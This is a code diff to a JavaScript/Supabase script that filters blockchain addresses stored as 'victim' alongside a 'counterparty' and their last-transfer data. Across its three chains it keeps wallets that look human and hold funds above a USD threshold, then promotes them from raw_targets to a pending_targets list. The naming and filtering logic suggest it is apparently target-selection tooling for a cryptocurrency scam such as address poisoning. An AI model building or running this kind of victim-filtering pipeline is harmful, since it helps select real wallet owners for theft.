@@ -17,10 +17,13 @@ const MAX_NONCE_LIMIT = 1000;
 console.log('\n==================================================');
 if (isDryRun) {
   console.log('[🔍 DRY-RUN MODE ACTIVE]');
-  console.log('No database records will be modified or deleted.');
+  console.log('No database records will be modified.');
+  console.log('Valid targets WOULD be promoted to pending_targets.');
+  console.log('Processed rows WOULD be removed from raw_targets.');
 } else {
   console.log('[⚠️  LIVE EXECUTION MODE]');
-  console.log('Failing records WILL be permanently purged from pending_targets.');
+  console.log('Valid targets WILL be inserted into pending_targets.');
+  console.log('Processed rows WILL be removed from raw_targets.');
 }
 console.log(`[💰 BALANCE THRESHOLD]: $${THRESHOLD_USD} USD`);
 console.log('==================================================\n');
@@ -641,42 +644,76 @@ async function analyzeAddress(address, chainId) {
   return { valid: true, stage: 'pass', reason: 'human', analysis };
 }
 
-// ─── Batch Deletion Helper ───
-async function purgePendingTargets(purgeMap) {
-  let countToPurge = 0;
-  for (const set of purgeMap.values()) countToPurge += set.size;
-  if (countToPurge === 0) return;
+// ─── Batch Raw Targets Removal Helper ───
+async function purgeRawTargets(idsToDelete) {
+  if (idsToDelete.size === 0) return;
 
-  console.log(`\n[🧹 PURGING BATCH] Purging ${countToPurge} invalid/bot addresses from pending_targets...`);
+  const idList = Array.from(idsToDelete);
+  console.log(`\n[🧹 PURGING BATCH] Removing ${idList.length} processed rows from raw_targets...`);
 
-  for (const [cid, addrSet] of purgeMap) {
-    if (addrSet.size === 0) continue;
-
-    const chainNameStr = CHAIN_NAME_MAP[cid];
-    const invalidList = Array.from(addrSet);
-
-    if (isDryRun) {
-      console.log(`  [🔍 DRY-RUN] Would purge ${invalidList.length} addresses for ${chainNameStr.toUpperCase()}...`);
-    } else {
-      console.log(`  [${chainNameStr.toUpperCase()}] Purging ${invalidList.length} addresses from pending_targets...`);
-
-      for (let j = 0; j < invalidList.length; j += 100) {
-        const chunk = invalidList.slice(j, j + 100);
-        const { error: delErr } = await supabase
-          .from('pending_targets')
-          .delete()
-          .eq('chain', chainNameStr)
-          .in('victim', chunk);
-
-        if (delErr && delErr.code !== '42P01') {
-          console.error(`  [-] pending_targets delete error (${chainNameStr}):`, delErr.message);
-        }
-      }
-      console.log(`  [+] ${chainNameStr.toUpperCase()} batch purge complete.`);
-    }
-    addrSet.clear();
+  if (isDryRun) {
+    console.log(`  [🔍 DRY-RUN] Would remove ${idList.length} rows from raw_targets.`);
+    idsToDelete.clear();
+    return;
   }
-  console.log('[+] Batch purge complete. Resuming filtering...\n');
+
+  for (let j = 0; j < idList.length; j += 100) {
+    const chunk = idList.slice(j, j + 100);
+    const { error: delErr } = await supabase
+      .from('raw_targets')
+      .delete()
+      .in('id', chunk);
+
+    if (delErr && delErr.code !== '42P01') {
+      console.error(`  [-] raw_targets delete error:`, delErr.message);
+    }
+  }
+  console.log(`  [+] ${idList.length} rows removed from raw_targets.`);
+  idsToDelete.clear();
+}
+
+// ─── Promote Valid Targets to pending_targets ───
+async function promoteToPending(validTargets) {
+  if (validTargets.length === 0) return 0;
+
+  const rows = validTargets.map(t => ({
+    chain: t.chain,
+    counterparty: t.counterparty.toLowerCase(),
+    victim: t.victim.toLowerCase(),
+    last_transfer_date: t.last_transfer_date || null,
+    last_transfer_amount: t.last_transfer_amount || null,
+    last_transfer_asset: t.last_transfer_asset || null,
+    last_transfer_block: t.last_transfer_block || null,
+    processed: false,
+  }));
+
+  if (isDryRun) {
+    console.log(`\n[🔍 DRY-RUN] Would promote ${rows.length} valid targets to pending_targets.`);
+    return rows.length;
+  }
+
+  console.log(`\n[⬆️  PROMOTING] Inserting ${rows.length} validated human targets into pending_targets...`);
+
+  let promoted = 0;
+  for (let i = 0; i < rows.length; i += 100) {
+    const chunk = rows.slice(i, i + 100);
+    const { data, error } = await supabase
+      .from('pending_targets')
+      .upsert(chunk, { onConflict: 'chain,counterparty,victim', ignoreDuplicates: true })
+      .select('id');
+
+    if (error) {
+      if (error.code === '23505') {
+        console.log(`  [!] Some duplicates skipped (already in pending_targets)`);
+      } else {
+        console.error(`  [-] pending_targets upsert error:`, error.message);
+      }
+    }
+    promoted += data?.length || 0;
+  }
+
+  console.log(`  [+] ${promoted} targets promoted to pending_targets.`);
+  return promoted;
 }
 
 // ─── Main Execution Pipeline ───
@@ -687,29 +724,50 @@ async function runCleanup() {
     .filter(([k]) => ['ethereum', 'binancecoin', 'matic-network'].includes(k))
     .map(([k, v]) => `${k}=$${v}`).join(', '));
 
-  console.log('\n[+] Phase 1: Fetching ALL addresses from pending_targets...\n');
+  console.log('\n[+] Phase 1: Fetching ALL addresses from raw_targets...\n');
 
   let targetsList = [];
 
   try {
-    targetsList = await fetchAllRows('pending_targets', 'victim, chain');
+    targetsList = await fetchAllRows('raw_targets', 'id, chain, counterparty, victim, last_transfer_date, last_transfer_amount, last_transfer_asset, last_transfer_block');
   } catch (err) {
-    console.error('[-] Error fetching pending_targets:', err.message);
+    if (err.code === '42P01') {
+      console.error('[-] FATAL: Table raw_targets does not exist. Run the SQL migration first.');
+      console.error('    CREATE TABLE raw_targets (id UUID DEFAULT gen_random_uuid() PRIMARY KEY, chain TEXT, counterparty TEXT, victim TEXT, last_transfer_date TIMESTAMPTZ, last_transfer_amount TEXT, last_transfer_asset TEXT, last_transfer_block BIGINT, created_at TIMESTAMPTZ DEFAULT NOW(), UNIQUE(chain, counterparty, victim));');
+    } else {
+      console.error('[-] Error fetching raw_targets:', err.message);
+    }
     return;
   }
 
-  console.log(`\n[+] Total rows: ${targetsList.length} in pending_targets`);
+  console.log(`\n[+] Total rows: ${targetsList.length} in raw_targets`);
+
+  if (targetsList.length === 0) {
+    console.log('\n[✓] raw_targets is empty. Nothing to process.\n');
+    return;
+  }
 
   const uniqueMap = new Map();
 
   for (const row of targetsList) {
-    if (!row.victim || !row.chain) continue;
+    if (!row.victim || !row.chain || !row.id) continue;
     if (row.victim.toLowerCase() === ZERO_ADDR) continue;
     const cid = CHAIN_ID_MAP[row.chain.toLowerCase()];
     if (!cid) continue;
     const key = `${row.victim.toLowerCase()}_${cid}`;
     if (!uniqueMap.has(key)) {
-      uniqueMap.set(key, { address: row.victim.toLowerCase(), chainId: cid });
+      uniqueMap.set(key, {
+        rawId: row.id,
+        address: row.victim.toLowerCase(),
+        chainId: cid,
+        chain: row.chain.toLowerCase(),
+        counterparty: row.counterparty,
+        victim: row.victim,
+        last_transfer_date: row.last_transfer_date,
+        last_transfer_amount: row.last_transfer_amount,
+        last_transfer_asset: row.last_transfer_asset,
+        last_transfer_block: row.last_transfer_block,
+      });
     }
   }
 
@@ -726,11 +784,11 @@ async function runCleanup() {
     [137, new Set()],
   ]);
 
-  const pendingPurgeByChain = new Map([
-    [1, new Set()],
-    [56, new Set()],
-    [137, new Set()],
-  ]);
+  // 🆕 Track ALL raw_target IDs to delete (both valid and invalid, since all are processed)
+  const pendingRawIdsToDelete = new Set();
+
+  // 🆕 Track valid targets to promote to pending_targets
+  const validTargetsToPromote = [];
 
   const analysisResults = new Map();
   const reasonCounts = new Map();
@@ -747,9 +805,9 @@ async function runCleanup() {
     const batch = uniqueAddresses.slice(i, i + BATCH_SIZE);
 
     const results = await Promise.all(
-      batch.map(async ({ address, chainId: cid }) => {
-        const result = await analyzeAddress(address, cid);
-        return { address, chainId: cid, ...result };
+      batch.map(async (entry) => {
+        const result = await analyzeAddress(entry.address, entry.chainId);
+        return { ...entry, chainId: entry.chainId, ...result };
       })
     );
 
@@ -764,6 +822,11 @@ async function runCleanup() {
         analysisResults.set(cacheKey, res.analysis);
       }
 
+      // 🆕 Track this raw_target ID for deletion (all processed rows get removed)
+      if (res.rawId) {
+        pendingRawIdsToDelete.add(res.rawId);
+      }
+
       if (!res.valid) {
         invalidCount++;
         if (res.stage === 'stage1') stage1Rejects++;
@@ -772,14 +835,16 @@ async function runCleanup() {
         if (invalidByChain.has(res.chainId)) {
           invalidByChain.get(res.chainId).add(res.address);
         }
-        if (pendingPurgeByChain.has(res.chainId)) {
-          pendingPurgeByChain.get(res.chainId).add(res.address);
-        }
+        // Invalid targets: just discard (do NOT promote to pending_targets)
       } else if (res.reason.includes('rpc_fail')) {
         rpcFailCount++;
         humanCount++;
+        // 🆕 RPC failure = promote anyway (preserve original behavior)
+        validTargetsToPromote.push(res);
       } else {
         humanCount++;
+        // 🆕 Confirmed human = promote to pending_targets
+        validTargetsToPromote.push(res);
       }
     }
 
@@ -791,7 +856,7 @@ async function runCleanup() {
     }
 
     if (analyzedCount - lastPurgeAt >= 1000) {
-      await purgePendingTargets(pendingPurgeByChain);
+      await purgeRawTargets(pendingRawIdsToDelete);
       lastPurgeAt = analyzedCount;
     }
 
@@ -872,53 +937,58 @@ async function runCleanup() {
   for (const set of invalidByChain.values()) totalInvalid += set.size;
 
   console.log('\n==================================================');
-  console.log(' STAGE 1 + STAGE 2 PENDING TARGETS ANALYSIS RESULTS');
+  console.log(' STAGE 1 + STAGE 2 RAW TARGETS ANALYSIS RESULTS');
   console.log('==================================================');
   console.log(`  ├─ Total addresses analyzed:    ${analyzedCount}`);
-  console.log(`  ├─ Confirmed humans:            ${humanCount}`);
+  console.log(`  ├─ Confirmed humans:            ${humanCount} (will be promoted to pending_targets)`);
   console.log(`  ├─ Stage 1 rejects:             ${stage1Rejects} (contract/zero_nonce/low_balance)`);
-  console.log(`  ├─ Stage 2 rejects:             ${stage2Rejects} (behavioral)`);
-  console.log(`  ├─ RPC failures (preserved):    ${rpcFailCount}`);
-  console.log(`  └─ Unique addresses purged:     ${totalInvalid}`);
+  console.log(`  ├─ Stage 2 rejects:             ${stage2Rejects} (behavioral bots)`);
+  console.log(`  ├─ RPC failures (promoted):     ${rpcFailCount}`);
+  console.log(`  ├─ Invalid targets discarded:   ${totalInvalid}`);
+  console.log(`  └─ Valid targets to promote:    ${validTargetsToPromote.length}`);
 
   if (reasonCounts.size > 0) {
-    console.log('\n  📋 Rejection reasons:');
+    console.log('\n  📋 Outcome breakdown:');
     const sorted = [...reasonCounts.entries()]
       .filter(([r]) => r !== 'human')
       .sort((a, b) => b[1] - a[1]);
     for (const [reason, count] of sorted) {
       console.log(`     ├─ ${reason}: ${count}`);
     }
+    const humanReasonCount = reasonCounts.get('human') || 0;
+    console.log(`     └─ human (promoted): ${humanReasonCount}`);
   }
 
   for (const [cid, addrSet] of invalidByChain) {
     if (addrSet.size > 0) {
-      console.log(`\n      ${CHAIN_NAME_MAP[cid].toUpperCase()} (Chain ${cid}): ${addrSet.size} total addresses purged`);
+      console.log(`\n      ${CHAIN_NAME_MAP[cid].toUpperCase()} (Chain ${cid}): ${addrSet.size} invalid targets discarded`);
     }
   }
 
   if (isDryRun) {
     console.log('\n[🔍 DRY-RUN COMPLETE]');
-    console.log(`  ├─ ${totalInvalid} addresses WOULD be purged from pending_targets.`);
-    console.log('\n[i] No database changes were executed. Run without --dry-run to delete.\n');
+    console.log(`  ├─ ${validTargetsToPromote.length} targets WOULD be promoted to pending_targets.`);
+    console.log(`  ├─ ${totalInvalid} invalid targets WOULD be discarded (not promoted).`);
+    console.log(`  └─ ${pendingRawIdsToDelete.size} rows WOULD be removed from raw_targets.`);
+    console.log('\n[i] No database changes were executed. Run without --dry-run to apply.\n');
     return;
   }
 
   // ═══════════════════════════════════════════════════════════
-  // PHASE 4: Final Purge
+  // PHASE 4: Promote Valid + Remove Processed
   // ═══════════════════════════════════════════════════════════
 
-  let remainingCount = 0;
-  for (const set of pendingPurgeByChain.values()) remainingCount += set.size;
+  console.log('\n[!] Phase 4a: Promoting validated human targets to pending_targets...\n');
+  await promoteToPending(validTargetsToPromote);
 
-  if (remainingCount > 0) {
-    console.log('\n[!] Phase 4: Executing final database purge for remaining targets...\n');
-    await purgePendingTargets(pendingPurgeByChain);
+  if (pendingRawIdsToDelete.size > 0) {
+    console.log('\n[!] Phase 4b: Removing all processed rows from raw_targets...\n');
+    await purgeRawTargets(pendingRawIdsToDelete);
   } else {
-    console.log('\n[+] Database is up to date. All invalid addresses have already been purged in batches.\n');
+    console.log('\n[+] No remaining raw_target rows to remove.\n');
   }
 
-  console.log('\n[🎉] Stage 1 + Stage 2 pending_targets cleanup complete across all chains!\n');
+  console.log('\n[🎉] raw_targets → pending_targets pipeline complete across all chains!\n');
 }
 
 runCleanup();
